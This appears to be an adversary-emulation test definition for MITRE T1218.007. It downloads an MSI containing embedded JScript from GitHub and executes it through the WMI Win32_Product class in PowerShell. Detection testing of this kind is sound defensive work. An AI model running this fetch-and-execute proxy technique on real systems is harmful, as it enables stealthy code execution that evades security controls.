api_version: "2.0"
name: WMI Win32_Product Class - Execute Local MSI file with embedded JScript
description: |
    Executes an MSI containing embedded JScript code using the WMI Win32_Product class
args:
    - name: msi_payload
      type: path
      default: PathToAtomicsFolder\T1218.007\bin\T1218.007_JScript.msi
    - name: action
      type: string
      default: Install
uuid: 882082f0-27c6-4eec-a43c-9aa80bccdb30
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1218: System Binary Proxy Execution'
    subtechniques:
        - 'T1218.007: Msiexec'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        The MSI file must exist on disk at specified location (#{msi_payload})
      inline: |
        if (Test-Path "#{msi_payload}") {exit 0} else {{New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi" -OutFile "#{msi_payload}"
        }}
      executor: powershell
    - name: wmi-win32_product-class---execute-local-msi-file-with-embedded-jscript
      inline: |
        Invoke-CimMethod -ClassName Win32_Product -MethodName {{.Args.action}} -Arguments @{ PackageLocation = '{{.Args.msi_payload}}' }
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
